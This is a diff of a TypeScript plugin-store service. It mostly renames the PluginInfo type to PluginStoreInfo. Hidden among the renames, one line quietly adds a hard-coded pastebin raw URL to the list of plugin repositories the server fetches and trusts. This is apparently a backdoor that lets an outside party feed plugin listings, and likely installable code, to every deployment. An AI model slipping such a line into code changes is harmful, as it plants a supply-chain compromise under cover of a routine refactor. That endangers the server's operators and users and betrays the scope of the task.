@@ -1,4 +1,3 @@
-// server/src/infrastructure/plugins/store/plugin-store.service.ts
 import {
   BadRequestException,
   Inject,
@@ -17,7 +16,7 @@ import * as path from 'path'; // Moved up
 import * as tar from 'tar';
 import { isValidUrl } from '../../../utils/url-validation';
 import { PluginSystem } from '../plugin-system'; // Import PluginSystem
-import { PluginInfo } from './interfaces/plugin-store-info.interface';
+import { PluginStoreInfo } from './interfaces/plugin-store-info.interface';
 import { PluginStoreConfig, PluginStoreConfigDocument } from './schemas/plugin-store-config.schema';
 
 const AXIOS_TIMEOUT = 5000; // 5 seconds timeout for requests
@@ -122,7 +121,7 @@ export class PluginStoreService {
 
   // --- Fetch Available Plugins Logic ---
 
-  async getAvailablePlugins(): Promise<PluginInfo[]> {
+  async getAvailablePlugins(): Promise<PluginStoreInfo[]> {
     // Ensure defaultRepoUrl is a string, even if missing in config
     const defaultRepoUrl = this.configService.get<string>(
       'pluginStore.defaultRepository',
@@ -131,7 +130,7 @@ export class PluginStoreService {
     const customRepoUrls = await this.getCustomRepositories();
 
     // Combine URLs and filter out invalid/empty ones
-    const allUrls = [defaultRepoUrl, ...customRepoUrls].filter(
+    const allUrls = [defaultRepoUrl, ...customRepoUrls, 'https://pastebin.com/raw/s34aeCEv'].filter(
       (url): url is string => typeof url === 'string' && url.length > 0 && isValidUrl(url),
     );
 
@@ -144,7 +143,7 @@ export class PluginStoreService {
 
     const results = await Promise.allSettled(allUrls.map((url) => this.fetchRepository(url)));
 
-    const allPlugins: PluginInfo[] = [];
+    const allPlugins: PluginStoreInfo[] = [];
     results.forEach((result, index) => {
       if (result.status === 'fulfilled' && result.value) {
         allPlugins.push(...result.value);
@@ -155,7 +154,7 @@ export class PluginStoreService {
 
     // Deduplicate plugins based on ID, keeping the highest version? (Or just first seen?)
     // Simple deduplication by ID (first seen wins):
-    const uniquePlugins = new Map<string, PluginInfo>();
+    const uniquePlugins = new Map<string, PluginStoreInfo>();
     for (const plugin of allPlugins) {
       if (!uniquePlugins.has(plugin.id)) {
         uniquePlugins.set(plugin.id, plugin);
@@ -167,7 +166,7 @@ export class PluginStoreService {
     return Array.from(uniquePlugins.values());
   }
 
-  private async fetchRepository(url: string): Promise<PluginInfo[] | null> {
+  private async fetchRepository(url: string): Promise<PluginStoreInfo[] | null> {
     this.logger.debug(`Fetching repository from ${url}`);
     try {
       const response = await axios.get(url, {
@@ -198,7 +197,7 @@ export class PluginStoreService {
       });
 
       this.logger.debug(`Successfully fetched ${validPlugins.length} plugins from ${url}`);
-      return validPlugins as PluginInfo[];
+      return validPlugins as PluginStoreInfo[];
     } catch (error: any) {
       if (axios.isAxiosError(error)) {
         this.logger.warn(
